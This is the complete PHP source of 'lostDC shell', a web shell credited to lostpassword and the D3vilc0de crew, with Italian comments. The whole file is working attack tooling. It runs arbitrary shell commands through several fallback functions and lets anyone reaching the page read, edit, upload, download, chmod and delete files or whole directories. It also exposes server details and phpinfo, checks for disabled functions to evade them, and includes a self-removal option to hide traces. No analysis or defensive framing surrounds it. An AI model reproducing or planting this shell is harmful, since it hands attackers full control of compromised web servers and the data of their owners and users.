 <?php

/* *
 * 
 * lostDC shell
 * PHP Shell scritta da lostpassword, D3vilc0de crew
 * Rilasciata sotto licenza GPL 2009/2010
 * Data rilascio: 25/12/2009 (eh si, il giorno di natale non avevo niente da fare)
 * La Shell presenta varie funzioni, ma rimane comunque in continuo aggiornamento
 * 
 * */

if (!function_exists("getTime")) {
    function getTime() {
        list($usec, $sec) = explode(" ", microtime());
        return ((float)$usec + (float)$sec);
     }
}
define("startTime",getTime());

if (!function_exists("shellexec")) {
    function shellexec($cmd) {
         global $disablefunc;
         $result = "";
         if (!empty($cmd)) {
              if (is_callable("exec") and !in_array("exec",$disablefunc)) {
                  exec($cmd,$result); 
                  $result = join("\n",$result);
              } elseif (($result = `$cmd`) !== FALSE) {}
              elseif (is_callable("system") and !in_array("system",$disablefunc)) {
                  $v = ob_get_contents(); 
                  ob_clean(); 
                  system($cmd); 
                  $result = ob_get_contents(); 
                  ob_clean(); 
                  echo $v;
              } elseif (is_resource($fp = popen($cmd,"r"))) {
                   $result = "";
                   while(!feof($fp)) {
                       $result .= fread($fp,1024);
                   }
                   pclose($fp);
              }
         }
         return $result;
    }
}

function getperms ($file) {        
    $perm = substr(sprintf('%o', fileperms($file)), -4);
    return $perm;
}

if (!function_exists("view_size")) {
    function view_size($size){
         if (!is_numeric($size)) {
             return FALSE;
         } else {
              if ($size >= 1073741824) {
                  /* Conversione da Byte a GigaByte */
                  $size = round($size/1073741824*100)/100 ." GB";
              } elseif ($size >= 1048576) {
                  /* Conversione da Byte a MegaByte */
                  $size = round($size/1048576*100)/100 ." MB";
              } elseif ($size >= 1024) {
                  /* Conversione da Byte a KiloByte */
                  $size = round($size/1024*100)/100 ." KB";
              } else {
                  /* Byte */
                  $size = $size . " B";
              }
              return $size;
         }
    }
}

function getinfo()
{
    $info  = '';
    $info .= '[~]Versione PHP: ' .phpversion() .'<br />';
    $info .= '[~]Server: ' .$_SERVER['HTTP_HOST'] .'<br />';
    $info .= '[~]Indirizzo IP: ' .$_SERVER['SERVER_ADDR'] .'<br />';
    $info .= '[~]Software: ' .$_SERVER['SERVER_SOFTWARE'].'<br />';
    $info .= '[~]Charset: ' .$_SERVER['HTTP_ACCEPT_CHARSET'] . '<br />';
    $info .= ((ini_get('safe_mode') == 0) ? '[~]Safe Mode: <font color="#00FF33">OFF</font><br />'    : '[~]Safe Mode: <font color="#FF3300">OFF</font><br />');
    $info .= ((ini_get('magic_quotes_gpc') == 0) ? '[~]Magic Quotes: <font color="#00FF33">OFF</font><br />' : '[~]Magic Quotes: <font color="#FF3300">ON</font><br />');
    if (is_callable("disk_free_space")) {
        $d = realpath(".");
         $free = disk_free_space($d);
         $total = disk_total_space($d);
         if ($free === FALSE || $free < 0) {
             $free = 0;
         }
         if ($total === FALSE || $total < 0) {
             $total = 0;
         }
         $used = $total-$free;
         $info .= "[~]Free space: ".view_size($free)."/".view_size($total)."<br />";
    }
    return $info;
}
 
if (!isset ($_GET ['dir'])){
    $dir = getcwd ();
}
else {
    $dir = $_GET ['dir'];
}
chdir ($dir);
 
$current = getcwd ();
$c = "?dir=" . $current;

$home = "<html>
    <head>
        <title>lostDC - ".$current."</title>
        <style type=\"text/css\">
        body {
            color: #FFFFFF;
            background-color: black;
            font-family: Courier New, Verdana, Arial;
            font-size: 11px;
            cursor: crosshair;
        }
        a:link {
            color: #FFFFFF;
            text-decoration: none;
        }
        a:visited {
            color: #FFFFFF;
            text-decoration: none;
        }
        a:hover {
            cursor: crosshair;
             text-decoration: none;
            color: #808080;
        }
        a.head {
            text-decoration: none;
            text-color: #FF0000;
        }
        a.head:hover {
            cursor: crosshair;
            text-decoration: none;
            color: #FF0000;
        }
        table {
            font-size: 11px;
        }
        td.list {
            border: 1px solid white;
            font-size: 11px;
        }
        td.list:hover {
            background: #222;
        }
        #info {
            font-size:            12px;
            width:                50%;
            margin-left:        20%;
            text-align: left;
        }
        #foot {
            font-size:            12px;
            width:                65%;
            margin-left:        20%;
            text-align: left;
        }
        input:hover, textarea:hover {
            background: #808080;
            cursor: crosshair;
        }
        #perm {
            color: #FF0000;
        }

    </style>
    </head>
    <body>";

print $home."<center><a href = \"".$_SERVER['PHP_SELF']."\"><img src = \"http://img367.imageshack.us/img367/9834/bannerdc2bygu.png\" border = \"none\"></a></center>";
print "<hr size=\"1\" width=\"60%\" noshade />\n<div id = \"info\">[~]Directory corrente: " . getcwd () . "<br />".getinfo()."</div>\n<hr size=\"1\" width=\"60%\" noshade />";
 
print "<table width = 60% height = 10% align = \"center\">\n";
print "<tr>\n";
print "<td>[ <a class = \"head\" href = '" . $c . "&mode=create'>New</a> ]</td>\n";
print "<td>[ <a class = \"head\" href = '" . $c . "&mode=phpinfo'>PHP Info</a> ]</td>\n";
print "<td>[ <a class = \"head\" href = '" . $c . "&mode=nopaste&action=ins'>No-Paste</a> ]</td>\n";
print "<td>[ <a class = \"head\" href = '" . $c . "&mode=execute'>Shell Command</a> ]</td>\n";
print "<td>[ <a class = \"head\" href = '" . $c . "&mode=hasher'>Hasher</a> ]</td>\n";
print "<td>[ <a class = \"head\" href = '" .$c . "&mode=selfremove'>Self Remove</a> ]</td>\n";
print "</tr></table><center>";
 
$mode = $_GET ['mode'];
switch ($mode) {
    case "edit":
        $file = $_GET ['file'];
        $new = $_POST ['new'];
        if (empty ($new)) {
            $fp = fopen ($file , "r");
            $cont = fread ($fp, filesize ($file));
            $cont = str_replace ("<textarea>" , "<textarea>" , $cont);
            print "<form action = '" . $c . "&mode=edit&file=" . $file . "' method = 'POST'>\n";
            print "File: ". $file . "<br />\n";
            print "<textarea name = 'new' rows = '25' cols = '100'>" . $cont . "</textarea><br />\n";
            print "<input type = 'submit' value = 'Edit'></form>\n";
        }
        else {
            $fp = fopen ($file , "w");
            if (fwrite ($fp , $new)) {
                header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir);
            }
            else {
                print "Impossibile editare " . $file . "<br />\n";
                echo "<a href=\"javascript:history.go(-1)\">Indietro</a><br /><br />\n";
            }
        }
        fclose ($fp);
        break;
    case "upload":
        $temp = $_FILES ['file'] ['tmp_name'];
        $file = basename ($_FILES ['file'] ['name']);
        if (!empty ($file)) {
             if (move_uploaded_file ($temp , $file)) {
                header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir);
            }
            else {
                print "Impossibile caricare " . $file . "\n";
                echo "<a href=\"javascript:history.go(-1)\">Indietro</a><br /><br />\n";
            }
        }
        break;
    case "download":
        $filename = $_GET['filename'];
        header("Pragma: no-cache");
        header("Expires: 0");
        header ( "Content-type: application/octet-stream" );
        header ( "Content-Disposition: attachment; filename=".$filename.";" );
        header ( "Content-Description: Download manager" );
        header ( "Content-Length: " . filesize ($filename) );
        readfile ($filename);
        break;
    case "rename":
        $old = $_GET ['old'];
        print "<form action = '". $c . "&mode=rename&old=" . $old . "' method = 'POST'>\n";
        print "New name: <input name = 'new'><br />\n";
        print "<input type = 'submit' value = 'Rename'></form>\n";
        $new = $_POST ['new'];
        if (!empty ($new)) {
            if (rename ($old , $new)) {
                header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir);
            }
            else {
                print "Impossibile rinominare " . $old . ".<p>\n";
                echo "<a href=\"javascript:history.go(-1)\">Indietro</a><br /><br />\n";
            }
        }
        break;
    case "chmod":
        if (chmod($_POST['tomod'], intval($_POST['mod'], 8)) == false) {
            print "Impossibile cambiare i permessi a " .$_POST['tomod'] . "<br />";
            echo "<a href=\"javascript:history.go(-1)\">Indietro</a><br /><br />\n";
        }
        else {
            header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir);
            // print "".$_POST['tomod']." con permessi: ".intval($_POST['mod'], 8)." e' stato chmoddato\n";
        }
        break;
    case "remove":
        $file = $_GET ['file'];
        if (unlink ($file)) {
            header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir);
        }
        else {
            print "Impossibile rimuovere " . $file . " <br />\n";
            echo "<a href=\"javascript:history.go(-1)\">Indietro</a><br /><br />\n";
        }
        break;
    case "selfremove":
        header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir.'&mode=remove&file='.__FILE__);
        break;
    case "makedir":
        if (mkdir($_POST['dir'], 0777) == false) {
            print "Impossibile creare directory; " .$_POST['dir'] . " <br />\n";
            echo "<a href=\"javascript:history.go(-1)\">Indietro</a><br /><br />\n";
        } else {
            header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']);
        }
        break;
    case "godir":
        $goto = $_POST['goto'];
        if (isset($_POST['goto'])) {
            chdir($goto);
            header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].$c.'/'.$goto);
        } else {
            header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']);
        }
        break;
    case "elimina":
        $dire = $_GET['dire'];
        if ($handle = opendir($dire)) {
            $array = array();
            while (false != ($file = readdir($handle))) {
                if ($file != "." && $file != "..") {
                    if(is_dir($dire.$file)) {
                        if(!rmdir($dire.$file)) { 
                            delete_directory($dire.$file.'/'); 
                        }
                    }
                    else {
                        unlink($dire.$file);
                    }
                }
            }
            closedir($handle);
            rmdir($dire);
        }
        header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir);
        break;
    case "create":
        $new = $_POST ['new'];
        if (isset($_POST['new'])) {
            if (!empty ($new)) {
                if ($fp = fopen ($new, "w")){
                    header('Location: http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?dir='.$dir);
                }
                else {
                    print "Impossibile creare " . $file . ".<p>\n";
                    echo "<a href=\"javascript:history.go(-1)\">Indietro</a></center><br /><br />\n";
                }
                fclose ($fp);
            }
        }
        else {
            print "<form action = '" . $c . "&mode=create' method = 'POST'>\n";
            print "<tr><td>New file: <input name = 'new'></td>\n";
            print "<td><input type = 'submit' value = 'Create'></td></tr></form>\n";
        }
            break;
    case "nopaste":
            switch ($_GET ['action']) {
                case "ins":
                    print "<form action '" . $c . "&action=ins' method = 'POST'>\n";
                    print "Title: <input type = 'text' name = 'title'><br />\n";
                    print "Language: <input type = 'text' name = 'language'><br />\n";
                    print "Script: <br /><textarea name = 'source' rows = '30' cols = '50'></textarea><br />\n";
                    print "<input type = 'submit' value = 'Submit'></form>\n";
                    if (!empty ($_POST ['title']) && !empty ($_POST ['language']) && !empty ($_POST ['source']))
                    {
                        $file = rand (1000000, 9999999);
                        $fp = fopen ($file, "w");
                        fwrite ($fp, $_POST ['title'] . "\n" . $_POST ['language'] . "\n\n" . $_POST ['source']);
                        fclose ($fp);
                        header ("Location: {$c}&mode=nopaste&action=view&id={$file}");
                    }
                    break;
                case "view":
                    $id = $_GET ['id'];
                    $fp = fopen ($id, "r");
                    $read = fread ($fp, filesize ($id));
                    print "<table border = '1'>\n<tr>\n<td>\n<pre>" . htmlentities ($read) . "</pre></td>\n</tr>\n</table>\n";
                    fclose ($fp);
                    break;
            }
        break;
    case "execute":
        $command = $_POST ['command'];
        if (!isset ($_POST['command'])) {
            print "<table>\n<form action = '" . $c . "&mode=execute' method = 'POST'>\n";
            print "<tr>\n<td><input type = 'text' name = 'command'></td>\n</tr>\n";
            print "<tr>\n<td><input type = 'submit' value = 'Execute'></td>\n</tr>\n</form>\n</table>";
        }
        else {
            $ret = shellexec($command);
            if ($ret == "") {
                print "Il comando non puo' essere eseguito sul server<br /><br /><br />\n";
            }
            else {
                print "Executing the following command:<br />\n";
                print "<textarea rows = '5' cols = '60'>".$command."</textarea><br />\n";
                print "Result:<br /> <textarea rows = '5' cols = '60'>".$ret."</textarea><br /><br /><br />\n";
            }
        }
        break;
    case "hasher":
        print "<table>\n<form action = '" . $c . "&mode=hasher' method = 'POST'>\n";
        print "<tr>\n<td><input type = 'text' name = 'hash'></td>\n</tr>\n";
        print "<tr>\n<td><select name = 'type'>\n";
        print "<option>md4</option>\n";
        print "<option>md5</option>\n";
        print "<option>sha1</option>\n";
        print "<option>gost</option>\n";
        print "<option>crc32</option>\n";
        print "<option>adler32</option>\n";
        print "<option>whirlpool</option>\n";
        print "</select></td>\n</tr>";
        print "<tr>\n<td><input type = 'submit' value = 'hash'></td>\n</tr></form>\n</table>";
        if (!empty ($_POST ['hash']) && !empty ($_POST ['type'])) {
            print $_POST ['hash'] . ": " . "<b>" . hash ($_POST ['type'], $_POST ['hash']) . "</b>";
        }
        break;
    case "phpinfo":
        phpinfo();
        break;
    default:
        print "<table style = \"border: 1px solid black;\" width=\"60%\">\n";
        $files = scandir ($dir);
        foreach ($files as $out) {
            if (is_file ($out)) {
                
                print "<tr>\n<td width = \"55%\" class = \"list\"><a href = " .$c ."&mode=download&filename=".$out.">" . $out ."</a></td>\n";
                print "<td width = \"10%\" class = \"list\">".view_size(filesize($out))."</td>";
                print "<td class = \"list\"><div id = \"perm\">" . getperms ($out) . "</div></td>\n";
                print "<td class = \"list\" align = \"right\"><a href = '" . $c ."&mode=edit&file=" . $out . "'><img src = 'http://img189.imageshack.us/img189/9858/editj.gif' alt = \"edita file\" border = \"none\"></a>
                <a href = '" . $c ."&mode=remove&file=" . $out . "'><img src = 'http://img193.imageshack.us/img193/9589/deletef.gif' alt = \"elimina file\" border = \"none\"></a>
                <a href = '" . $c ."&mode=rename&old=" . $out . "'><img src = 'http://img51.imageshack.us/img51/7241/replyl.gif' alt = \"rinomina file\" border = \"none\"></a>
                </td>\n</tr>";
            }
            else {
                if ($out != "." && $out != "..") {
                    print "<tr>\n<td width = \"55%\" class = \"list\"><a href = " . $c . "/" .  $out . ">" . $out . "</a></td>\n";
                    print "<td width = \"10%\" class = \"list\">FOLDER</td>";
                    print "<td class = \"list\"><div id = \"perm\">" . getperms ($out) . "</div></td>\n";
                    print "<td class = \"list\" align = \"right\"><a href = '" . $c ."&mode=elimina&dire=" . $out . "'><img src = 'http://img193.imageshack.us/img193/9589/deletef.gif' alt = \"elimina directory\" border = \"none\"></a></td>\n</tr>";
            }
            if ($out == "..")
                print "<td width = \"55%\" class = \"list\"><a href = " . $c . "/" . $out . ">..</a></td>\n";
            }
        }
    print "</table>\n";
}

print "</center>\n<hr size=\"1\" width=\"60%\" noshade />";
print "\n</hr>";
print "<table id = \"foot\">
           <tr>
               <td width = \"40%\">
                   <form action = '" . $c . "&mode=upload' method = 'POST' ENCTYPE='multipart/form-data'>
                           Upload file: <input type = 'file' name = 'file'>
                           <input type = 'submit' value = 'Upload'>
                   </form>
               </td>
               <td width = \"50%\">
                       <form method=\"POST\" action=\"".$c."&mode=chmod\">
                           Chmod File: <input type=\"text\" name=\"tomod\" value = \"filename\"> 
                           <input type=\"number\" name=\"mod\" value = \"0666\"> 
                           <input type=\"submit\" name=\"submit\" value=\"Chmod\">
                       </form>
               </td>
           </tr>
           <tr>
                   <td width = \"40%\">
                       <form method=\"POST\" action=\"?dir='.$c.'&mode=makedir\">
                           Mkdir: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <input type=\"text\" name=\"dir\" value=\"namedir\"> 
                           <input type=\"submit\" name=\"submit\" value=\"Create\">
                    </form>
                   </td>
                   <td width = \"50%\">
                       <form action = '" . $c . "&mode=create' method = 'POST'>
                        New file:&nbsp;&nbsp; <input name = 'new'>
                        <input type = 'submit' value = 'Create'></form>
                   </td>
           </tr>
           <tr>
            <td>
                <form method = \"POST\" action = \"?dir='.$c.'&mode=godir\">
                    Go dir:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <input name = 'goto'>
                    <input type = 'submit' value = 'Go'>
                </form>
            </td>
           </tr>
       </table><hr size=\"1\" width=\"60%\" noshade />\n</hr>";
    print "<center>[ Generation time: ".round(getTime()-startTime,4)." seconds | by <a href=\"http://lostpassword.hellospace.net\">lostpassword</a> and <a href = \"http://www.d3vilc0de.org\">D3vilc0de crew</a> ]</center>\n</body>\n</html>";

?> 
